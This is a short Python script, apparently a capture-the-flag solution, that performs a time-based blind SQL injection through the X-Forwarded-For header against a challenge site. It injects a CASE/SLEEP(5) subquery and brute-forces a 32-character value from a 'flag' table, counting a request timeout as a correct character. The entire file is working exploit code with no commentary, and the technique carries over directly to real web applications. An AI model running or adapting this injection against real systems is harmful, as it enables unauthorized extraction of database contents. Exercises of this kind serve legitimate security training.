#-*-coding:utf-8-*-
import requests
import string
url='http://ctf5.shiyanbar.com/web/wonderkun/index.php'
guess = string.lowercase + string.uppercase + string.digits
flag = ''

for i in range(1,33):
	for str in guess:
		headers = {'x-forwarded-for':"xx'+"+"(select case when (substring((select flag "+
		"from flag) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1" %(i,str)}
		try:
			res = requests.get(url,headers=headers,timeout=4)
		except requests.exceptions.ReadTimeout as e:
			flag =flag + str
			print 'flag:',flag
			break
print 'result:' +flag

